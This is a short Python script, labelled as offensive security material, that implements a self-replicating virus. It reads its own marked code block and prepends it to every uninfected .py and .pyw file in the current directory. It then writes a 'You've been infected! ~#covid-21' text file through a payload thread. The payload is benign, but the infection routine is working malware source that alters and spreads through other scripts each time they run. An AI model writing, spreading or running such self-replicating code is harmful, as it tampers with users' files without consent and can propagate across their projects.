#!/bin/python3

# Networking -> Security -> Offensive
# 1.3.2021

### START OF VIRUS ###

import sys, glob, threading

code =[]
with open(sys.argv[0], 'r') as f:
	lines = f.readlines()

# if you find yourself, copy yourself	
virus_area = False
for line in lines:
	if line == '### START OF VIRUS ###\n': virus_area = True
	if virus_area: code.append(line)
	if line == '### END OF VIRUS ###\n': break

# pyw files are python files that open without a console window in windows
python_scripts = glob.glob('*.py')+glob.glob('*.pyw')

# check directory files	
for script in python_scripts:
	with open(script, 'r') as f:
		script_code = f.readlines()
	
	# if the file(s) is already infected, skip
	infected = False
	for line in script_code:
		if line == '### START OF VIRUS ###\n':
			infected = True
			break
	
	# else, infect the file(s)
	if not infected: 
		final_code =[]
		final_code.extend(code)
		final_code.extend('\n')
		final_code.extend(script_code)
		
		with open(script, 'w') as f:
			f.writelines(final_code)

# payload: just a text file with a message
def covid():
	print("You've been infected! ~#covid-21")
	with open('covid_21.txt', 'w') as fp: 
		fp.write("You've been infected! ~#covid-21")
		pass

# payload delivered in a separate thread
try:
	t = threading.Thread(target=covid)
	t.start()
except:
	print("Error: unable to start thread")

### END OF VIRUS ###

	